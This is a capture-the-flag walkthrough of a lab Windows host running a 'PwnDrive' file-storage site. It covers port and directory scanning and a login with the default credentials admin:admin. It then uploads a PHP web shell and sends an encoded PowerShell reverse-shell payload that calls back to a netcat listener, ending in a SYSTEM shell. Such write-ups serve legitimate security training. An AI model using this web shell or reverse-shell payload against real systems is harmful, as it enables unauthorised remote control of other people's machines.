<h2>Recon</h2>

<h3>PortScanning</h3>

command:```sudo nmap -A 10.150.150.11 -p- -T4 -v```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 11:55 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:55
Completed NSE at 11:55, 0.00s elapsed
Initiating NSE at 11:55
Completed NSE at 11:55, 0.00s elapsed
Initiating NSE at 11:55
Completed NSE at 11:55, 0.00s elapsed
Initiating Ping Scan at 11:55
Scanning 10.150.150.11 [4 ports]
Completed Ping Scan at 11:55, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:55
Completed Parallel DNS resolution of 1 host. at 11:55, 0.08s elapsed
Initiating SYN Stealth Scan at 11:55
Scanning 10.150.150.11 [65535 ports]
Discovered open port 21/tcp on 10.150.150.11
Discovered open port 80/tcp on 10.150.150.11
Discovered open port 3306/tcp on 10.150.150.11
Discovered open port 445/tcp on 10.150.150.11
Discovered open port 3389/tcp on 10.150.150.11
Discovered open port 443/tcp on 10.150.150.11
Discovered open port 139/tcp on 10.150.150.11
Discovered open port 135/tcp on 10.150.150.11
Increasing send delay for 10.150.150.11 from 0 to 5 due to 253 out of 631 dropped probes since last increase.
Increasing send delay for 10.150.150.11 from 5 to 10 due to 51 out of 126 dropped probes since last increase.
Discovered open port 49153/tcp on 10.150.150.11
Discovered open port 47001/tcp on 10.150.150.11
SYN Stealth Scan Timing: About 4.78% done; ETC: 12:06 (0:10:17 remaining)
Discovered open port 49155/tcp on 10.150.150.11
SYN Stealth Scan Timing: About 7.43% done; ETC: 12:09 (0:12:39 remaining)
SYN Stealth Scan Timing: About 12.26% done; ETC: 12:09 (0:11:56 remaining)
SYN Stealth Scan Timing: About 17.12% done; ETC: 12:08 (0:11:13 remaining)
Discovered open port 49152/tcp on 10.150.150.11
SYN Stealth Scan Timing: About 22.83% done; ETC: 12:09 (0:10:32 remaining)
Discovered open port 49154/tcp on 10.150.150.11
SYN Stealth Scan Timing: About 28.49% done; ETC: 12:09 (0:09:50 remaining)
SYN Stealth Scan Timing: About 33.86% done; ETC: 12:09 (0:09:07 remaining)
SYN Stealth Scan Timing: About 39.32% done; ETC: 12:09 (0:08:22 remaining)
Discovered open port 49157/tcp on 10.150.150.11
SYN Stealth Scan Timing: About 44.55% done; ETC: 12:09 (0:07:41 remaining)
SYN Stealth Scan Timing: About 50.03% done; ETC: 12:09 (0:06:57 remaining)
SYN Stealth Scan Timing: About 55.09% done; ETC: 12:09 (0:06:15 remaining)
Discovered open port 49192/tcp on 10.150.150.11
SYN Stealth Scan Timing: About 60.39% done; ETC: 12:09 (0:05:33 remaining)
Discovered open port 49156/tcp on 10.150.150.11
SYN Stealth Scan Timing: About 65.75% done; ETC: 12:09 (0:04:48 remaining)
SYN Stealth Scan Timing: About 71.05% done; ETC: 12:09 (0:04:04 remaining)
SYN Stealth Scan Timing: About 76.34% done; ETC: 12:09 (0:03:19 remaining)
SYN Stealth Scan Timing: About 81.61% done; ETC: 12:09 (0:02:35 remaining)
SYN Stealth Scan Timing: About 86.67% done; ETC: 12:09 (0:01:53 remaining)
SYN Stealth Scan Timing: About 91.89% done; ETC: 12:09 (0:01:09 remaining)
Discovered open port 1433/tcp on 10.150.150.11
Completed SYN Stealth Scan at 12:09, 870.04s elapsed (65535 total ports)
Initiating Service scan at 12:09
Scanning 17 services on 10.150.150.11
Service scan Timing: About 58.82% done; ETC: 12:11 (0:00:34 remaining)
Completed Service scan at 12:11, 105.07s elapsed (17 services on 1 host)
Initiating OS detection (try #1) against 10.150.150.11
Retrying OS detection (try #2) against 10.150.150.11
Retrying OS detection (try #3) against 10.150.150.11
Retrying OS detection (try #4) against 10.150.150.11
Retrying OS detection (try #5) against 10.150.150.11
Initiating Traceroute at 12:11
Completed Traceroute at 12:11, 0.34s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:11
Completed Parallel DNS resolution of 2 hosts. at 12:11, 0.05s elapsed
NSE: Script scanning 10.150.150.11.
Initiating NSE at 12:11
Completed NSE at 12:12, 12.06s elapsed
Initiating NSE at 12:12
Completed NSE at 12:12, 5.95s elapsed
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
Nmap scan report for 10.150.150.11
Host is up (0.15s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Xlight ftpd 3.9
80/tcp    open  http               Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3345FF745865D02B994859241BCE2B36
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: PwnDrive - Your Personal Online Storage
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
443/tcp   open  ssl/http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-title: PwnDrive - Your Personal Online Storage
|_http-favicon: Unknown favicon MD5: 3345FF745865D02B994859241BCE2B36
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
|_SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-03-05T11:51:06+00:00; +38m58s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-08-24T13:11:13
| Not valid after:  2050-08-24T13:11:13
| MD5:   2d8f22bc83a0987714a49d976707fe79
|_SHA-1: 4bbd57877eb1e46ef5fc8c3a84c0ae68f1490272
3306/tcp  open  mysql              MySQL 5.5.5-10.4.14-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.14-MariaDB
|   Thread ID: 1051
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsTransactions, FoundRows, Speaks41ProtocolOld, IgnoreSigpipes, SupportsCompression, LongColumnFlag, DontAllowDatabaseTableColumn, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ODBCClient, ConnectWithDatabase, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: %RLe8)`+UJQ;o?-c+L}R
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: PWNDRIVE
|   NetBIOS_Domain_Name: PWNDRIVE
|   NetBIOS_Computer_Name: PWNDRIVE
|   DNS_Domain_Name: PwnDrive
|   DNS_Computer_Name: PwnDrive
|   Product_Version: 6.1.7601
|_  System_Time: 2023-03-05T11:50:54+00:00
|_ssl-date: 2023-03-05T11:51:06+00:00; +38m59s from scanner time.
| ssl-cert: Subject: commonName=PwnDrive
| Issuer: commonName=PwnDrive
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-03-04T10:06:05
| Not valid after:  2023-09-03T10:06:05
| MD5:   545a07e1b26b7c1e16153cf662b8c0f8
|_SHA-1: ed3f1c515f2fd18646465623665b1e4ad66a8520
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49192/tcp open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100.00; RTM
|_ssl-date: 2023-03-05T11:51:07+00:00; +38m59s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-08-24T13:11:13
| Not valid after:  2050-08-24T13:11:13
| MD5:   2d8f22bc83a0987714a49d976707fe79
|_SHA-1: 4bbd57877eb1e46ef5fc8c3a84c0ae68f1490272
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/5%OT=21%CT=1%CU=32423%PV=Y%DS=2%DC=T%G=Y%TM=6404790D
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=7
OS:)SEQ(SP=103%GCD=1%ISR=105%TI=I%CI=I%TS=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST
OS:11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000
OS:%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54D
OS:NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
OS:T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 4.059 days (since Wed Mar  1 10:46:33 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: PwnDrive
|   NetBIOS computer name: PWNDRIVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-05T03:50:55-08:00
| smb2-time: 
|   date: 2023-03-05T11:50:54
|_  start_date: 2020-08-24T13:11:20
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h47m33s, deviation: 3h01m25s, median: 38m58s
| nbstat: NetBIOS name: PWNDRIVE, NetBIOS user: <unknown>, NetBIOS MAC: 000c298987cb (VMware)
| Names:
|   PWNDRIVE<20>         Flags: <unique><active>
|   PWNDRIVE<00>         Flags: <unique><active>
|_  WORKGROUP<00>        Flags: <group><active>

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   342.79 ms 10.66.66.1
2   152.88 ms 10.150.150.11

NSE: Script Post-scanning.
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
Initiating NSE at 12:12
Completed NSE at 12:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1008.29 seconds
           Raw packets sent: 74095 (3.266MB) | Rcvd: 70228 (2.814MB)
```
We have quite a number of ports opened here. We'll be starting our enumeration from port 80




<h2>Enumeration Port 80</h2>

Going to the webpage should get you this

![image](https://user-images.githubusercontent.com/67879936/222957186-b02e220e-dee2-4cbf-b466-d1981f67d8f7.png)

Lets go ahead and fuzz for directories

command:```ffuf -u "http://10.150.150.11/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/Pwndrive_Academy]
└─$ ffuf -u "http://10.150.150.11/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.150.150.11/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 4036, Words: 1153, Lines: 102, Duration: 518ms]

admin                   [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 280ms]
Admin                   [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 407ms]
ADMIN                   [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 385ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 367ms]
css                     [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 366ms]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 310ms]
Download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 357ms]
favicon.ico             [Status: 200, Size: 104623, Words: 50, Lines: 50, Duration: 243ms]
img                     [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 310ms]
inc                     [Status: 301, Size: 336, Words: 22, Lines: 10, Duration: 249ms]
index.php               [Status: 200, Size: 4036, Words: 1153, Lines: 102, Duration: 252ms]
licenses                [Status: 403, Size: 1204, Words: 127, Lines: 46, Duration: 362ms]
login.php               [Status: 200, Size: 3191, Words: 776, Lines: 81, Duration: 330ms]
Login.php               [Status: 200, Size: 3191, Words: 776, Lines: 81, Duration: 392ms]
phpmyadmin              [Status: 403, Size: 1204, Words: 127, Lines: 46, Duration: 1213ms]
server-status           [Status: 403, Size: 1204, Words: 127, Lines: 46, Duration: 1653ms]
upload                  [Status: 301, Size: 339, Words: 22, Lines: 10, Duration: 1299ms]
uploadfile.php          [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1711ms]
utils                   [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 1678ms]
vendor                  [Status: 301, Size: 339, Words: 22, Lines: 10, Duration: 1523ms]
webalizer               [Status: 403, Size: 1045, Words: 102, Lines: 43, Duration: 502ms]
:: Progress: [32298/32298] :: Job [1/1] :: 48 req/sec :: Duration: [0:10:11] :: Errors: 1 ::
```
woah, lots of directories. Lets navigate to the ```/login.php``` directory. We'll try to login with default creds

```username:admin```      ```password:admin```

![image](https://user-images.githubusercontent.com/67879936/222958450-7fd78ef7-725d-4f38-84f6-680c99918b24.png)

We'll try to add a malicious php file here. Lets go ahead and exploit this



<h2>Exploitation</h2>

payload:```<?php system($_GET['cmd']); ?>```

save this payload in a ```.php``` file, then upload it to the webserver

```                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/Pwndrive_Academy]
└─$ gedit abeg.php
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/Pwndrive_Academy]
└─$ cat abeg.php
<?php system($_GET['cmd']); ?>
```
![image](https://user-images.githubusercontent.com/67879936/222958612-7682c8a1-d5eb-4251-ab43-f3bfdd5295a1.png)

![image](https://user-images.githubusercontent.com/67879936/222958702-69539fb5-3e9c-4c94-8ba8-0f79550aa5c8.png)

nice, our file has been uploaded successfully. If you recall when we were fuzzing for directories there was an ```/upload``` directory. Lets navigate to that directory to take a look at our uploaded file

![image](https://user-images.githubusercontent.com/67879936/222958911-b9f77ea3-0ac0-42da-8de6-b544b38c8f71.png)

our uploaded file is in one of these directories

![image](https://user-images.githubusercontent.com/67879936/222958939-3b1bc157-ab40-4dcb-9ed5-4eb46b612de3.png)

Yeah, we got it. Now, click on the uploaded file and add ```?cmd=whoami``` at the back of the url

![image](https://user-images.githubusercontent.com/67879936/222959354-2febb39d-4e32-4a94-b1d4-ce86b97ec33a.png)

cool, now let's upload our reverse shell so we can get a rev shell back to our machine.

payload:```cG93ZXJzaGVsbCAtZSBKQUJqQUd3QWFRQmxBRzRBZEFBZ0FEMEFJQUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVV3QjVBSE1BZEFCbEFHMEFMZ0JPQUdVQWRBQXVBRk1BYndCakFHc0FaUUIwQUhNQUxnQlVBRU1BVUFCREFHd0FhUUJsQUc0QWRBQW9BQ0lBTVFBd0FDNEFOZ0EyQUM0QU5nQTNBQzRBTVFBMUFEUUFJZ0FzQURFQU1nQXpBRFFBS1FBN0FDUUFjd0IwQUhJQVpRQmhBRzBBSUFBOUFDQUFKQUJqQUd3QWFRQmxBRzRBZEFBdUFFY0FaUUIwQUZNQWRBQnlBR1VBWVFCdEFDZ0FLUUE3QUZzQVlnQjVBSFFBWlFCYkFGMEFYUUFrQUdJQWVRQjBBR1VBY3dBZ0FEMEFJQUF3QUM0QUxnQTJBRFVBTlFBekFEVUFmQUFsQUhzQU1BQjlBRHNBZHdCb0FHa0FiQUJsQUNnQUtBQWtBR2tBSUFBOUFDQUFKQUJ6QUhRQWNnQmxBR0VBYlFBdUFGSUFaUUJoQUdRQUtBQWtBR0lBZVFCMEFHVUFjd0FzQUNBQU1BQXNBQ0FBSkFCaUFIa0FkQUJsQUhNQUxnQk1BR1VBYmdCbkFIUUFhQUFwQUNrQUlBQXRBRzRBWlFBZ0FEQUFLUUI3QURzQUpBQmtBR0VBZEFCaEFDQUFQUUFnQUNnQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBQzBBVkFCNUFIQUFaUUJPQUdFQWJRQmxBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQlVBR1VBZUFCMEFDNEFRUUJUQUVNQVNRQkpBRVVBYmdCakFHOEFaQUJwQUc0QVp3QXBBQzRBUndCbEFIUUFVd0IwQUhJQWFRQnVBR2NBS0FBa0FHSUFlUUIwQUdVQWN3QXNBREFBTEFBZ0FDUUFhUUFwQURzQUpBQnpBR1VBYmdCa0FHSUFZUUJqQUdzQUlBQTlBQ0FBS0FCcEFHVUFlQUFnQUNRQVpBQmhBSFFBWVFBZ0FESUFQZ0FtQURFQUlBQjhBQ0FBVHdCMUFIUUFMUUJUQUhRQWNnQnBBRzRBWndBZ0FDa0FPd0FrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0F5QUNBQVBRQWdBQ1FBY3dCbEFHNEFaQUJpQUdFQVl3QnJBQ0FBS3dBZ0FDSUFVQUJUQUNBQUlnQWdBQ3NBSUFBb0FIQUFkd0JrQUNrQUxnQlFBR0VBZEFCb0FDQUFLd0FnQUNJQVBnQWdBQ0lBT3dBa0FITUFaUUJ1QUdRQVlnQjVBSFFBWlFBZ0FEMEFJQUFvQUZzQWRBQmxBSGdBZEFBdUFHVUFiZ0JqQUc4QVpBQnBBRzRBWndCZEFEb0FPZ0JCQUZNQVF3QkpBRWtBS1FBdUFFY0FaUUIwQUVJQWVRQjBBR1VBY3dBb0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFESUFLUUE3QUNRQWN3QjBBSElBWlFCaEFHMEFMZ0JYQUhJQWFRQjBBR1VBS0FBa0FITUFaUUJ1QUdRQVlnQjVBSFFBWlFBc0FEQUFMQUFrQUhNQVpRQnVBR1FBWWdCNUFIUUFaUUF1QUV3QVpRQnVBR2NBZEFCb0FDa0FPd0FrQUhNQWRBQnlBR1VBWVFCdEFDNEFSZ0JzQUhVQWN3Qm9BQ2dBS1FCOUFEc0FKQUJqQUd3QWFRQmxBRzRBZEFBdUFFTUFiQUJ2QUhNQVpRQW9BQ2tB```

Note: You can’t use same payload I used because it is encoded in base64 and also url encoded, You can generate yours [here](https://www.revshells.com/)

Ensure you set your netcat listener so you can get a reverse shell back on it

command:```rlwrap nc -nvlp 1234```

![image](https://user-images.githubusercontent.com/67879936/222959673-6e7d46ee-78cf-4c81-a4e8-b2b09291d4eb.png)

![image](https://user-images.githubusercontent.com/67879936/222959646-af577b5f-72d7-4bb8-905d-a80390694e7c.png)

Boom!!! We got a shell as ```nt authority\system```. To get the flag ```C:\Users\Administrator\Desktop```

![image](https://user-images.githubusercontent.com/67879936/222959737-e056a6c1-69a5-40a2-bee1-e0dff75f0f9a.png)

That will be all today
<br> <br>
[Back To Home](../../index.md)






























